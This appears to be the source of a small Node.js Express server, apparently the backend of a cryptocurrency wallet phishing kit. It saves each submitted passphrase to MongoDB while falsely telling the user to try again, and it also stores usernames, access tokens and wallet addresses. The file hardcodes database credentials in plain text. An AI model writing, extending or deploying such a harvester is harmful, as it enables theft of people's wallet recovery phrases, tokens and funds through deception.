const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const port = 5000; // You can use any port number

// Middleware
app.use(bodyParser.json());
app.use(cors());

// Connect to MongoDB
mongoose.connect('mongodb+srv://admin:admin@pimaritial.puvxqoy.mongodb.net/shaadi', {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});

const passphraseSchema = new mongoose.Schema({
  passphrase: String,
});

const Passphrase = mongoose.model('Passphrase', passphraseSchema);

// Schema for authentication result
const authResultSchema = new mongoose.Schema({
  username: String,
  accessToken: String,
  walletAddress: String,
  // add other fields as needed
});

const AuthResult = mongoose.model('AuthResult', authResultSchema);

// API endpoint to handle form submission
app.post('/api/passphrase', async (req, res) => {
  try {
    const newPassphrase = new Passphrase({
      passphrase: req.body.passphrase,
    });

    await newPassphrase.save();
    res.status(200).send('Please check your passphrase and try again.');
  } catch (error) {
    res.status(500).send('Error saving passphrase');
  }
});

// API endpoint to save authentication result
app.post('/api/save-auth-result', async (req, res) => {
  try {
    const newAuthResult = new AuthResult(req.body);
    await newAuthResult.save();
    res.status(201).send('Authentication result saved successfully');
  } catch (error) {
    res.status(500).send('Error saving authentication result');
  }
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
